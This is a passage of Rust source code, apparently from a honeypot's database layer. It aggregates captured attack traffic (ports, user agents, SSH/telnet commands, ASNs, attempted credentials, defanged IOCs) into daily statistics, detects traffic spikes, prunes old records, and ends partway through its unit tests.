        let spikes = annotate_spikes(&mut points);
        Ok(TimeSeriesResponse {
            granularity: "day".to_string(),
            top_services,
            points,
            spikes,
        })
    }

    // ==================== ATTACK INTELLIGENCE (TAGS, PORTS, UA, COMMANDS, ASN, IOCS) ====================

    pub async fn get_intelligence(&self, since_hours: i64) -> Result<IntelligenceResponse> {
        let (today_start, since_ts, first_complete_day) = Self::window_bounds(since_hours);

        let mut tag_map: HashMap<String, i64> = HashMap::new();
        let mut port_map: HashMap<String, i64> = HashMap::new();
        let mut ua_map: HashMap<String, i64> = HashMap::new();
        let mut cmd_map: HashMap<String, i64> = HashMap::new();
        let mut asn_map: HashMap<String, i64> = HashMap::new();

        if since_hours > 24 && first_complete_day < today_start {
            let rows: Vec<(
                Option<String>,
                Option<String>,
                Option<String>,
                Option<String>,
                Option<String>,
            )> = sqlx::query_as(
                r#"
                SELECT tag_counts, port_counts, user_agent_counts, command_counts, asn_counts
                FROM stats_daily
                WHERE day_bucket >= ? AND day_bucket < ?
                "#,
            )
            .bind(first_complete_day)
            .bind(today_start)
            .fetch_all(&self.pool)
            .await?;

            for (t_json, p_json, ua_json, c_json, a_json) in rows {
                merge_json_map(&mut tag_map, t_json.as_deref());
                merge_json_map(&mut port_map, p_json.as_deref());
                merge_json_map(&mut ua_map, ua_json.as_deref());
                merge_json_map(&mut cmd_map, c_json.as_deref());
                merge_json_map(&mut asn_map, a_json.as_deref());
            }
        }

        let live_since = if since_hours <= 24 { since_ts } else { today_start };

        // Live queries in parallel
        let (live_ports, live_uas, live_tags, live_cmds, live_asns, scanner_row, ioc_rows) = tokio::join!(
            sqlx::query_as::<_, (i32, i64)>(
                "SELECT port, COUNT(*) as c FROM requests WHERE timestamp >= ? AND port IS NOT NULL AND port > 0 GROUP BY port ORDER BY c DESC LIMIT 50"
            )
            .bind(live_since)
            .fetch_all(&self.pool),
            sqlx::query_as::<_, (String, i64)>(
                "SELECT user_agent, COUNT(*) as c FROM requests WHERE timestamp >= ? AND user_agent IS NOT NULL AND user_agent != '' GROUP BY user_agent ORDER BY c DESC LIMIT 50"
            )
            .bind(live_since)
            .fetch_all(&self.pool),
            sqlx::query_as::<_, (String, i64)>(
                "SELECT tags, COUNT(*) as c FROM requests WHERE timestamp >= ? AND tags IS NOT NULL AND tags != '' GROUP BY tags ORDER BY c DESC LIMIT 200"
            )
            .bind(live_since)
            .fetch_all(&self.pool),
            sqlx::query_as::<_, (String,)>(
                "SELECT payload FROM requests WHERE timestamp >= ? AND payload IS NOT NULL AND (service = 'ssh' OR service = 'ssh-alt' OR service = 'telnet' OR service = 'telnet-alt') ORDER BY id DESC LIMIT 1000"
            )
            .bind(live_since)
            .fetch_all(&self.pool),
            sqlx::query_as::<_, (i64, Option<String>, i64)>(
                "SELECT asn, asn_org, COUNT(*) as c FROM requests WHERE timestamp >= ? AND asn IS NOT NULL GROUP BY asn, asn_org ORDER BY c DESC LIMIT 50"
            )
            .bind(live_since)
            .fetch_all(&self.pool),
            sqlx::query_as::<_, (i64,)>(
                "SELECT COUNT(*) FROM requests WHERE timestamp >= ? AND COALESCE(is_scanner, 0) = 1"
            )
            .bind(since_ts)
            .fetch_one(&self.pool),
            sqlx::query_as::<_, (i64, String, String, String, String, Option<String>)>(
                "SELECT timestamp, ip, service, ioc_type, value, context FROM iocs WHERE timestamp >= ? ORDER BY id DESC LIMIT 30"
            )
            .bind(since_ts)
            .fetch_all(&self.pool),
        );

        for (port, c) in live_ports.unwrap_or_default() {
            *port_map.entry(port.to_string()).or_insert(0) += c;
        }
        for (ua, c) in live_uas.unwrap_or_default() {
            *ua_map.entry(ua).or_insert(0) += c;
        }
        for (tags_csv, c) in live_tags.unwrap_or_default() {
            for tag in tags_csv.split(',').filter(|s| !s.is_empty()) {
                *tag_map.entry(tag.to_string()).or_insert(0) += c;
            }
        }
        for (hex_payload,) in live_cmds.unwrap_or_default() {
            if let Ok(bytes) = hex::decode(&hex_payload) {
                if let Ok(text) = String::from_utf8(bytes) {
                    for line in text.lines() {
                        let cmd = line.trim();
                        if !cmd.is_empty() {
                            *cmd_map.entry(cmd.to_string()).or_insert(0) += 1;
                        }
                    }
                }
            }
        }
        for (asn, org, c) in live_asns.unwrap_or_default() {
            let label = match org {
                Some(o) if !o.is_empty() => format!("AS{} {}", asn, o),
                _ => format!("AS{}", asn),
            };
            *asn_map.entry(label).or_insert(0) += c;
        }

        let scanner_from_tags: i64 = tag_map
            .iter()
            .filter(|(k, _)| k.starts_with("scanner:"))
            .map(|(_, v)| *v)
            .sum();
        let scanner_requests = scanner_row.map(|(c,)| c).unwrap_or(0).max(scanner_from_tags);

        let recent_iocs = ioc_rows
            .unwrap_or_default()
            .into_iter()
            .map(|(ts, ip, service, ioc_type, value, context)| StoredIoc {
                timestamp: DateTime::from_timestamp_millis(ts).unwrap_or_else(Utc::now),
                ip,
                service,
                ioc_type,
                defanged: ioc::defang(&value),
                value,
                context,
            })
            .collect();

        Ok(IntelligenceResponse {
            tags: map_to_top_stats(tag_map, 25),
            ports: map_to_top_stats(port_map, 25),
            user_agents: map_to_top_stats(ua_map, 25),
            commands: map_to_top_stats(cmd_map, 25),
            asns: map_to_top_stats(asn_map, 25),
            scanner_requests,
            recent_iocs,
        })
    }

    // ==================== ROLLUP AGGREGATION (called by background task) ====================

    pub async fn aggregate_day(&self, day_bucket: i64) -> Result<()> {
        let day_start = day_bucket;
        let day_end = day_bucket + DAY_MS;

        let (exists,): (i64,) =
            sqlx::query_as("SELECT COUNT(*) FROM stats_daily WHERE day_bucket = ?")
                .bind(day_bucket)
                .fetch_one(&self.pool)
                .await?;

        if exists > 0 {
            return Ok(());
        }

        let (total, total_bytes): (i64, i64) = sqlx::query_as(
            "SELECT COUNT(*), COALESCE(SUM(request_size), 0) FROM requests WHERE timestamp >= ? AND timestamp < ?",
        )
        .bind(day_start)
        .bind(day_end)
        .fetch_one(&self.pool)
        .await?;

        if total == 0 {
            return Ok(());
        }

        let service_rows: Vec<(String, i64)> = sqlx::query_as(
            "SELECT service, COUNT(*) FROM requests WHERE timestamp >= ? AND timestamp < ? GROUP BY service",
        )
        .bind(day_start)
        .bind(day_end)
        .fetch_all(&self.pool)
        .await?;
        let service_counts: HashMap<&str, i64> =
            service_rows.iter().map(|(s, c)| (s.as_str(), *c)).collect();
        let service_json = serde_json::to_string(&service_counts)?;

        let country_rows: Vec<(String, i64)> = sqlx::query_as(
            "SELECT country_code, COUNT(*) FROM requests WHERE timestamp >= ? AND timestamp < ? AND country_code IS NOT NULL GROUP BY country_code",
        )
        .bind(day_start)
        .bind(day_end)
        .fetch_all(&self.pool)
        .await?;
        let country_counts: HashMap<&str, i64> =
            country_rows.iter().map(|(s, c)| (s.as_str(), *c)).collect();
        let country_json = serde_json::to_string(&country_counts)?;

        let path_rows: Vec<(String, i64)> = sqlx::query_as(
            "SELECT http_path, COUNT(*) as c FROM requests WHERE timestamp >= ? AND timestamp < ? AND http_path IS NOT NULL GROUP BY http_path ORDER BY c DESC LIMIT 100",
        )
        .bind(day_start)
        .bind(day_end)
        .fetch_all(&self.pool)
        .await?;
        let path_counts: HashMap<&str, i64> =
            path_rows.iter().map(|(s, c)| (s.as_str(), *c)).collect();
        let path_json = serde_json::to_string(&path_counts)?;

        let cred_rows: Vec<(String, String, i64)> = sqlx::query_as(
            r#"SELECT username, password, COUNT(*) as c FROM requests
               WHERE timestamp >= ? AND timestamp < ? AND +username IS NOT NULL
               GROUP BY username, password ORDER BY c DESC LIMIT 100"#,
        )
        .bind(day_start)
        .bind(day_end)
        .fetch_all(&self.pool)
        .await?;
        let cred_counts: Vec<CredentialCount> = cred_rows
            .iter()
            .map(|(u, p, c)| CredentialCount {
                u: u.clone(),
                p: p.clone(),
                c: *c,
            })
            .collect();
        let cred_json = serde_json::to_string(&cred_counts)?;

        let loc_rows: Vec<(f64, f64, i64)> = sqlx::query_as(
            r#"SELECT ROUND(latitude, 1), ROUND(longitude, 1), COUNT(*) as c
               FROM requests WHERE timestamp >= ? AND timestamp < ?
               AND latitude IS NOT NULL GROUP BY ROUND(latitude, 1), ROUND(longitude, 1)
               ORDER BY c DESC LIMIT 500"#,
        )
        .bind(day_start)
        .bind(day_end)
        .fetch_all(&self.pool)
        .await?;
        let loc_counts: Vec<LocationCount> = loc_rows
            .iter()
            .map(|(lat, lon, c)| LocationCount {
                lat: *lat,
                lon: *lon,
                c: *c,
            })
            .collect();
        let loc_json = serde_json::to_string(&loc_counts)?;

        let ip_request_rows: Vec<(String, i64)> = sqlx::query_as(
            "SELECT ip, COUNT(*) as c FROM requests WHERE timestamp >= ? AND timestamp < ? GROUP BY ip ORDER BY c DESC LIMIT 100",
        )
        .bind(day_start)
        .bind(day_end)
        .fetch_all(&self.pool)
        .await?;
        let ip_request_counts: HashMap<&str, i64> = ip_request_rows
            .iter()
            .map(|(ip, c)| (ip.as_str(), *c))
            .collect();
        let ip_request_json = serde_json::to_string(&ip_request_counts)?;

        let ip_bytes_rows: Vec<(String, i64)> = sqlx::query_as(
            "SELECT ip, COALESCE(SUM(request_size), 0) as bytes FROM requests WHERE timestamp >= ? AND timestamp < ? GROUP BY ip ORDER BY bytes DESC LIMIT 100",
        )
        .bind(day_start)
        .bind(day_end)
        .fetch_all(&self.pool)
        .await?;
        let ip_bytes_counts: HashMap<&str, i64> = ip_bytes_rows
            .iter()
            .map(|(ip, b)| (ip.as_str(), *b))
            .collect();
        let ip_bytes_json = serde_json::to_string(&ip_bytes_counts)?;

        // Extended intelligence rollups
        let cmd_rows: Vec<(String,)> = sqlx::query_as(
            "SELECT payload FROM requests WHERE timestamp >= ? AND timestamp < ? AND payload IS NOT NULL AND (service = 'ssh' OR service = 'ssh-alt' OR service = 'telnet' OR service = 'telnet-alt') LIMIT 5000",
        )
        .bind(day_start)
        .bind(day_end)
        .fetch_all(&self.pool)
        .await?;
        let mut cmd_map: HashMap<String, i64> = HashMap::new();
        for (hex_p,) in cmd_rows {
            if let Ok(bytes) = hex::decode(&hex_p) {
                if let Ok(text) = String::from_utf8(bytes) {
                    for line in text.lines() {
                        let cmd = line.trim();
                        if !cmd.is_empty() {
                            *cmd_map.entry(cmd.to_string()).or_insert(0) += 1;
                        }
                    }
                }
            }
        }
        let cmd_json = serde_json::to_string(&top_n_map(cmd_map, 100))?;

        let ua_rows: Vec<(String, i64)> = sqlx::query_as(
            "SELECT user_agent, COUNT(*) as c FROM requests WHERE timestamp >= ? AND timestamp < ? AND user_agent IS NOT NULL AND user_agent != '' GROUP BY user_agent ORDER BY c DESC LIMIT 100",
        )
        .bind(day_start)
        .bind(day_end)
        .fetch_all(&self.pool)
        .await?;
        let ua_map: HashMap<String, i64> = ua_rows.into_iter().collect();
        let ua_json = serde_json::to_string(&ua_map)?;

        let port_rows: Vec<(i32, i64)> = sqlx::query_as(
            "SELECT port, COUNT(*) as c FROM requests WHERE timestamp >= ? AND timestamp < ? AND port IS NOT NULL AND port > 0 GROUP BY port ORDER BY c DESC LIMIT 100",
        )
        .bind(day_start)
        .bind(day_end)
        .fetch_all(&self.pool)
        .await?;
        let port_map: HashMap<String, i64> = port_rows
            .into_iter()
            .map(|(p, c)| (p.to_string(), c))
            .collect();
        let port_json = serde_json::to_string(&port_map)?;

        let tag_rows: Vec<(String, i64)> = sqlx::query_as(
            "SELECT tags, COUNT(*) as c FROM requests WHERE timestamp >= ? AND timestamp < ? AND tags IS NOT NULL AND tags != '' GROUP BY tags",
        )
        .bind(day_start)
        .bind(day_end)
        .fetch_all(&self.pool)
        .await?;
        let mut tag_map: HashMap<String, i64> = HashMap::new();
        for (tags_csv, c) in tag_rows {
            for t in tags_csv.split(',').filter(|s| !s.is_empty()) {
                *tag_map.entry(t.to_string()).or_insert(0) += c;
            }
        }
        let tag_json = serde_json::to_string(&top_n_map(tag_map, 100))?;

        let asn_rows: Vec<(i64, Option<String>, i64)> = sqlx::query_as(
            "SELECT asn, asn_org, COUNT(*) as c FROM requests WHERE timestamp >= ? AND timestamp < ? AND asn IS NOT NULL GROUP BY asn, asn_org ORDER BY c DESC LIMIT 100",
        )
        .bind(day_start)
        .bind(day_end)
        .fetch_all(&self.pool)
        .await?;
        let asn_map: HashMap<String, i64> = asn_rows
            .into_iter()
            .map(|(asn, org, c)| {
                let label = match org {
                    Some(o) if !o.is_empty() => format!("AS{} {}", asn, o),
                    _ => format!("AS{}", asn),
                };
                (label, c)
            })
            .collect();
        let asn_json = serde_json::to_string(&asn_map)?;

        sqlx::query(
            r#"INSERT INTO stats_daily (
                 day_bucket, total_requests, service_counts, country_counts, path_counts,
                 credential_counts, location_counts, total_bytes, ip_request_counts, ip_bytes_counts,
                 command_counts, user_agent_counts, port_counts, tag_counts, asn_counts
               )
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
               ON CONFLICT(day_bucket) DO UPDATE SET
                 total_requests = excluded.total_requests,
                 service_counts = excluded.service_counts,
                 country_counts = excluded.country_counts,
                 path_counts = excluded.path_counts,
                 credential_counts = excluded.credential_counts,
                 location_counts = excluded.location_counts,
                 total_bytes = excluded.total_bytes,
                 ip_request_counts = excluded.ip_request_counts,
                 ip_bytes_counts = excluded.ip_bytes_counts,
                 command_counts = excluded.command_counts,
                 user_agent_counts = excluded.user_agent_counts,
                 port_counts = excluded.port_counts,
                 tag_counts = excluded.tag_counts,
                 asn_counts = excluded.asn_counts"#,
        )
        .bind(day_bucket)
        .bind(total)
        .bind(&service_json)
        .bind(&country_json)
        .bind(&path_json)
        .bind(&cred_json)
        .bind(&loc_json)
        .bind(total_bytes)
        .bind(&ip_request_json)
        .bind(&ip_bytes_json)
        .bind(&cmd_json)
        .bind(&ua_json)
        .bind(&port_json)
        .bind(&tag_json)
        .bind(&asn_json)
        .execute(&self.pool)
        .await?;

        Ok(())
    }

    pub async fn get_days_needing_rollup(&self) -> Result<Vec<i64>> {
        let today_start = utc_today_start(Utc::now());

        let existing_rows: Vec<(i64,)> = sqlx::query_as("SELECT day_bucket FROM stats_daily")
            .fetch_all(&self.pool)
            .await?;
        let existing: HashSet<i64> = existing_rows.into_iter().map(|(d,)| d).collect();

        let (first_ts,): (Option<i64>,) =
            sqlx::query_as("SELECT MIN(timestamp) FROM requests WHERE timestamp < ?")
                .bind(today_start)
                .fetch_one(&self.pool)
                .await?;

        let Some(first_ts) = first_ts else {
            return Ok(Vec::new());
        };

        let mut missing = Vec::new();
        let mut cursor = ts_to_day_bucket(first_ts);

        while cursor < today_start {
            if existing.contains(&cursor) {
                cursor += DAY_MS;
                continue;
            }

            let (next_ts,): (Option<i64>,) = sqlx::query_as(
                "SELECT MIN(timestamp) FROM requests WHERE timestamp >= ? AND timestamp < ?",
            )
            .bind(cursor)
            .bind(today_start)
            .fetch_one(&self.pool)
            .await?;

            let Some(next_ts) = next_ts else {
                break;
            };

            let day = ts_to_day_bucket(next_ts);
            if !existing.contains(&day) {
                missing.push(day);
            }
            cursor = day + DAY_MS;
        }

        Ok(missing)
    }

    pub async fn prune_old_requests(&self, retention_days: u32) -> Result<u64> {
        if retention_days == 0 {
            return Ok(0);
        }

        const BATCH_SIZE: i64 = 5_000;

        let today_start = utc_today_start(Utc::now());
        let cutoff_ts = today_start - (retention_days as i64) * DAY_MS;

        let unrolled_days = self.get_days_needing_rollup().await?;
        let safe_cutoff = unrolled_days
            .into_iter()
            .min()
            .map(|d| d.min(cutoff_ts))
            .unwrap_or(cutoff_ts);

        let mut total_deleted: u64 = 0;
        loop {
            let result = sqlx::query(
                "DELETE FROM requests WHERE id IN (SELECT id FROM requests WHERE timestamp < ? LIMIT ?)",
            )
            .bind(safe_cutoff)
            .bind(BATCH_SIZE)
            .execute(&self.pool)
            .await?;

            let deleted = result.rows_affected();
            total_deleted += deleted;

            if deleted < BATCH_SIZE as u64 {
                break;
            }

            tokio::time::sleep(std::time::Duration::from_millis(50)).await;
        }

        // Prune old IOCs (retain at least 90 days)
        let ioc_retention = (retention_days.max(90)) as i64;
        let ioc_cutoff = today_start - ioc_retention * DAY_MS;
        let _ = sqlx::query("DELETE FROM iocs WHERE timestamp < ?")
            .bind(ioc_cutoff)
            .execute(&self.pool)
            .await;

        if total_deleted > 0 {
            let _ = sqlx::query("PRAGMA incremental_vacuum(1000)")
                .execute(&self.pool)
                .await;
        }

        Ok(total_deleted)
    }
}

// ==================== HELPER FUNCTIONS & STRUCTS ====================

fn utc_today_start(now: DateTime<Utc>) -> i64 {
    Utc.with_ymd_and_hms(now.year(), now.month(), now.day(), 0, 0, 0)
        .unwrap()
        .timestamp_millis()
}

fn ts_to_day_bucket(ts: i64) -> i64 {
    ts.div_euclid(DAY_MS) * DAY_MS
}

fn tags_to_db(tags: &[String]) -> Option<String> {
    if tags.is_empty() {
        None
    } else {
        Some(tags.join(","))
    }
}

fn db_to_tags(tags: Option<&str>) -> Vec<String> {
    tags.map(|s| {
        s.split(',')
            .map(|t| t.trim())
            .filter(|t| !t.is_empty())
            .map(|t| t.to_string())
            .collect()
    })
    .unwrap_or_default()
}

fn merge_json_map(target: &mut HashMap<String, i64>, json: Option<&str>) {
    if let Some(j) = json {
        if let Ok(map) = serde_json::from_str::<HashMap<String, i64>>(j) {
            for (k, v) in map {
                *target.entry(k).or_insert(0) += v;
            }
        }
    }
}

fn top_n_map(map: HashMap<String, i64>, n: usize) -> HashMap<String, i64> {
    let mut items: Vec<(String, i64)> = map.into_iter().collect();
    items.sort_by(|a, b| b.1.cmp(&a.1));
    items.truncate(n);
    items.into_iter().collect()
}

fn map_to_top_stats(map: HashMap<String, i64>, limit: usize) -> Vec<CountStat> {
    let mut items: Vec<CountStat> = map
        .into_iter()
        .map(|(name, count)| CountStat { name, count })
        .collect();
    items.sort_by(|a, b| b.count.cmp(&a.count));
    items.truncate(limit);
    items
}

fn top_n_keys(map: &HashMap<String, i64>, n: usize) -> Vec<String> {
    let mut pairs: Vec<(&String, &i64)> = map.iter().collect();
    pairs.sort_by(|a, b| b.1.cmp(a.1));
    pairs.into_iter().take(n).map(|(k, _)| k.clone()).collect()
}

fn compress_bucket_services(
    raw: HashMap<String, i64>,
    top_set: &HashSet<&str>,
) -> (i64, HashMap<String, i64>) {
    let mut total = 0i64;
    let mut out: HashMap<String, i64> = HashMap::new();
    for (svc, count) in raw {
        total += count;
        if top_set.contains(svc.as_str()) {
            *out.entry(svc).or_insert(0) += count;
        } else {
            *out.entry("other".to_string()).or_insert(0) += count;
        }
    }
    (total, out)
}

/// Detect wave/spike buckets across complete (non-partial) time-series points
/// using median baseline + standard-deviation guard to avoid spike self-masking.
fn annotate_spikes(points: &mut [TimeSeriesPoint]) -> SpikeSummary {
    let mut complete_values: Vec<f64> = points
        .iter()
        .filter(|p| !p.partial && p.total > 0)
        .map(|p| p.total as f64)
        .collect();

    if complete_values.len() < 3 {
        return SpikeSummary::default();
    }

    complete_values.sort_by(|a, b| a.partial_cmp(b).unwrap_or(std::cmp::Ordering::Equal));
    let n = complete_values.len();
    let median = if n % 2 == 1 {
        complete_values[n / 2]
    } else {
        (complete_values[n / 2 - 1] + complete_values[n / 2]) / 2.0
    };
    if median <= 0.0 {
        return SpikeSummary::default();
    }

    let mean = complete_values.iter().sum::<f64>() / (n as f64);
    let variance = complete_values
        .iter()
        .map(|v| {
            let d = v - mean;
            d * d
        })
        .sum::<f64>()
        / (n as f64);
    let stddev = variance.sqrt();
    let threshold = (median * 2.0).max(mean + 1.5 * stddev);

    let mut spike_count = 0usize;
    let mut peak_ts: Option<i64> = None;
    let mut peak_label: Option<String> = None;
    let mut peak_total = 0i64;
    let mut peak_mult = 0.0f64;

    for p in points.iter_mut() {
        p.baseline = (median * 10.0).round() / 10.0;
        let mult = p.total as f64 / median;
        p.multiplier = (mult * 100.0).round() / 100.0;

        if !p.partial && p.total >= 20 && (p.total as f64) >= threshold {
            p.is_spike = true;
            spike_count += 1;
            if p.total > peak_total {
                peak_total = p.total;
                peak_ts = Some(p.timestamp);
                peak_label = Some(p.label.clone());
                peak_mult = p.multiplier;
            }
        }
    }

    SpikeSummary {
        count: spike_count,
        peak_timestamp: peak_ts,
        peak_label,
        peak_total,
        peak_multiplier: peak_mult,
        baseline_avg: (median * 10.0).round() / 10.0,
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct CredentialCount {
    u: String,
    p: String,
    c: i64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct LocationCount {
    lat: f64,
    lon: f64,
    c: i64,
}

fn merge_service_stats(mut rollup: Vec<ServiceStat>, live: Vec<ServiceStat>) -> Vec<ServiceStat> {
    let mut map: HashMap<String, i64> = HashMap::new();
    for s in rollup.drain(..).chain(live) {
        *map.entry(s.service).or_insert(0) += s.count;
    }
    let total: i64 = map.values().sum();
    let mut result: Vec<ServiceStat> = map
        .into_iter()
        .map(|(service, count)| ServiceStat {
            service,
            count,
            percentage: if total > 0 {
                (count as f64 / total as f64) * 100.0
            } else {
                0.0
            },
        })
        .collect();
    result.sort_by(|a, b| b.count.cmp(&a.count));
    result
}

fn merge_credential_stats(
    mut rollup: Vec<CredentialStat>,
    live: Vec<CredentialStat>,
) -> Vec<CredentialStat> {
    let mut map: HashMap<(String, String), i64> = HashMap::new();
    for c in rollup.drain(..).chain(live) {
        *map.entry((c.username, c.password)).or_insert(0) += c.count;
    }
    let mut result: Vec<CredentialStat> = map
        .into_iter()
        .map(|((username, password), count)| CredentialStat {
            username,
            password,
            count,
        })
        .collect();
    result.sort_by(|a, b| b.count.cmp(&a.count));
    result.truncate(50);
    result
}

fn merge_path_stats(mut rollup: Vec<PathStat>, live: Vec<PathStat>) -> Vec<PathStat> {
    let mut map: HashMap<String, i64> = HashMap::new();
    for p in rollup.drain(..).chain(live) {
        *map.entry(p.path).or_insert(0) += p.count;
    }
    let mut result: Vec<PathStat> = map
        .into_iter()
        .map(|(path, count)| PathStat { path, count })
        .collect();
    result.sort_by(|a, b| b.count.cmp(&a.count));
    result.truncate(50);
    result
}

// ==================== RESPONSE TYPES ====================

#[derive(Debug, Clone, Default, Serialize)]
pub struct StatsResponse {
    pub total: i64,
    pub services: Vec<ServiceStat>,
    pub credentials: Vec<CredentialStat>,
    pub paths: Vec<PathStat>,
}

#[derive(Debug, Clone, Serialize)]
pub struct ServiceStat {
    pub service: String,
    pub count: i64,
    pub percentage: f64,
}

#[derive(Debug, Clone, Serialize)]
pub struct CredentialStat {
    pub username: String,
    pub password: String,
    pub count: i64,
}

#[derive(Debug, Clone, Serialize)]
pub struct PathStat {
    pub path: String,
    pub count: i64,
}

#[derive(Debug, Clone, Serialize)]
pub struct CountryStat {
    pub country_code: String,
    pub count: i64,
}

#[derive(Debug, Clone, Serialize)]
pub struct LocationStat {
    pub lat: f64,
    pub lon: f64,
    pub count: i64,
}

#[derive(Debug, Clone, Serialize)]
pub struct IpStat {
    pub ip: String,
    pub count: i64,
}

#[derive(Debug, Clone, Serialize)]
pub struct TimeSeriesPoint {
    pub timestamp: i64,
    pub label: String,
    pub total: i64,
    pub services: HashMap<String, i64>,
    pub is_spike: bool,
    pub baseline: f64,
    pub multiplier: f64,
    pub partial: bool,
}

#[derive(Debug, Clone, Default, Serialize)]
pub struct SpikeSummary {
    pub count: usize,
    pub peak_timestamp: Option<i64>,
    pub peak_label: Option<String>,
    pub peak_total: i64,
    pub peak_multiplier: f64,
    pub baseline_avg: f64,
}

#[derive(Debug, Clone, Serialize)]
pub struct TimeSeriesResponse {
    pub granularity: String,
    pub top_services: Vec<String>,
    pub points: Vec<TimeSeriesPoint>,
    pub spikes: SpikeSummary,
}

#[derive(Debug, Clone, Serialize)]
pub struct CountStat {
    pub name: String,
    pub count: i64,
}

#[derive(Debug, Clone, Serialize)]
pub struct StoredIoc {
    pub timestamp: DateTime<Utc>,
    pub ip: String,
    pub service: String,
    pub ioc_type: String,
    pub value: String,
    pub defanged: String,
    pub context: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
pub struct IntelligenceResponse {
    pub tags: Vec<CountStat>,
    pub ports: Vec<CountStat>,
    pub user_agents: Vec<CountStat>,
    pub commands: Vec<CountStat>,
    pub asns: Vec<CountStat>,
    pub scanner_requests: i64,
    pub recent_iocs: Vec<StoredIoc>,
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    struct TempDb {
        path: PathBuf,
        db: Database,
    }

    impl Drop for TempDb {
        fn drop(&mut self) {
            let _ = std::fs::remove_file(&self.path);
            let _ = std::fs::remove_file(format!("{}-wal", self.path.display()));
            let _ = std::fs::remove_file(format!("{}-shm", self.path.display()));
        }
    }

    async fn setup_temp_db() -> TempDb {
        let path =
            std::env::temp_dir().join(format!("honeypot_test_{}.db", uuid::Uuid::new_v4()));
        let cfg = DatabaseConfig {
            driver: "sqlite".to_string(),
            url: path.to_string_lossy().into_owned(),
            cache_size_mb: 16,
            retention_days: 30,
        };
        let db = Database::new(&cfg).await.unwrap();
        db.run_migrations().await.unwrap();
        TempDb { path, db }
    }

    async fn insert_request(
        db: &Database,
        ts_ms: i64,
        service: &str,
        username: Option<&str>,
        password: Option<&str>,
    ) {
        sqlx::query(
            "INSERT INTO requests (timestamp, ip, service, username, password, request_size) VALUES (?, '1.2.3.4', ?, ?, ?, 10)",
        )
        .bind(ts_ms)
        .bind(service)
        .bind(username)
        .bind(password)
        .execute(&db.pool)
        .await
        .unwrap();
    }

    #[tokio::test]
    async fn test_get_days_needing_rollup_skips_existing_and_gaps() {
        let tmp = setup_temp_db().await;
        let db = &tmp.db;

        assert_eq!(db.get_days_needing_rollup().await.unwrap(), Vec::<i64>::new());

        let today_start = utc_today_start(Utc::now());
        let day_10 = today_start - 10 * DAY_MS;
        let day_9 = today_start - 9 * DAY_MS;
        let day_5 = today_start - 5 * DAY_MS;
        let day_2 = today_start - 2 * DAY_MS;

        insert_request(db, day_10 + 1000, "ssh", None, None).await;
        insert_request(db, day_9 + 2000, "ssh", None, None).await;
        insert_request(db, day_5 + 3000, "ssh", None, None).await;
        insert_request(db, day_2 + 4000, "ssh", None, None).await;
        insert_request(db, today_start + 1000, "ssh", None, None).await;

        for day in [day_10, day_9] {
            sqlx::query("INSERT INTO stats_daily (day_bucket, total_requests) VALUES (?, 1)")
                .bind(day)
                .execute(&db.pool)
                .await
                .unwrap();
        }

        let needing = db.get_days_needing_rollup().await.unwrap();
        assert_eq!(needing, vec![day_5, day_2]);
    }

    #[tokio::test]
    async fn test_top_credentials_raw_uses_timestamp_index_and_counts_correctly() {
        let tmp = setup_temp_db().await;
        let db = &tmp.db;

        let now_ms = Utc::now().timestamp_millis();
        let since_ts = now_ms - 60_000;

        insert_request(db, since_ts - 5_000, "ssh", Some("old"), Some("oldpass")).await;
        insert_request(db, since_ts + 1_000, "http", None, None).await;
        insert_request(db, since_ts + 2_000, "ssh", Some("root"), Some("123456")).await;
        insert_request(db, since_ts + 3_000, "ssh", Some("root"), Some("123456")).await;
        insert_request(db, since_ts + 4_000, "ssh", Some("admin"), Some("admin")).await;

        let top = db.get_top_credentials_raw(since_ts, 10).await.unwrap();
        assert_eq!(top.len(), 2);
        assert_eq!(top[0].username, "root");
        assert_eq!(top[0].password, "123456");
        assert_eq!(top[0].count, 2);
        assert_eq!(top[1].username, "admin");
        assert_eq!(top[1].password, "admin");
        assert_eq!(top[1].count, 1);

        let plan_rows: Vec<(i64, i64, i64, String)> = sqlx::query_as(
            r#"
            EXPLAIN QUERY PLAN
            SELECT username, password, COUNT(*) as count
            FROM requests
            WHERE timestamp >= ? AND +username IS NOT NULL
            GROUP BY username, password
            ORDER BY count DESC
            LIMIT ?
            "#,
        )
        .bind(since_ts)
        .bind(10_i32)
        .fetch_all(&db.pool)
        .await
        .unwrap();

        let plan_text = plan_rows
            .into_iter()
            .map(|(_, _, _, detail)| detail)
            .collect::<Vec<_>>()
            .join(" | ");

        assert!(
            !plan_text.contains("idx_credentials"),
            "Query plan should not use idx_credentials: {}",
            plan_text
        );
        assert!(
            plan_text.contains("timestamp"),
            "Query plan should filter using a timestamp index: {}",
            plan_text
        );
    }

    #[tokio::test]
    async fn test_prune_old_requests_respects_rollup_and_preserves_total_count() {
        let tmp = setup_temp_db().await;
        let db = &tmp.db;

        assert_eq!(db.get_total_count().await.unwrap(), 0);

        let today_start = utc_today_start(Utc::now());
        let day_40 = today_start - 40 * DAY_MS;
        let day_35 = today_start - 35 * DAY_MS;
        let day_5 = today_start - 5 * DAY_MS;

        insert_request(db, day_40 + 1000, "ssh", None, None).await;
        insert_request(db, day_35 + 1000, "ssh", None, None).await;
        insert_request(db, day_5 + 1000, "ssh", None, None).await;
        assert_eq!(db.get_total_count().await.unwrap(), 3);

        assert_eq!(db.prune_old_requests(0).await.unwrap(), 0);
        assert_eq!(db.prune_old_requests(30).await.unwrap(), 0);

        db.aggregate_day(day_40).await.unwrap();
        assert_eq!(db.prune_old_requests(30).await.unwrap(), 1);

        db.aggregate_day(day_35).await.unwrap();
        assert_eq!(db.prune_old_requests(30).await.unwrap(), 1);

        db.aggregate_day(day_5).await.unwrap();
        assert_eq!(db.prune_old_requests(1).await.unwrap(), 1);
        let (remaining,): (i64,) = sqlx::query_as("SELECT COUNT(*) FROM requests")
            .fetch_one(&db.pool)
            .await
            .unwrap();
        assert_eq!(remaining, 0);
        assert_eq!(db.get_total_count().await.unwrap(), 3);
    }

    #[tokio::test]
    async fn test_migrations_idempotent_on_legacy_schema_and_drops_unused_indexes() {
        let path =
            std::env::temp_dir().join(format!("honeypot_legacy_{}.db", uuid::Uuid::new_v4()));
        let cfg = DatabaseConfig {
            driver: "sqlite".to_string(),
            url: path.to_string_lossy().into_owned(),
            cache_size_mb: 16,
            retention_days: 30,
        };
        let db = Database::new(&cfg).await.unwrap();

        // Create legacy schema without new columns
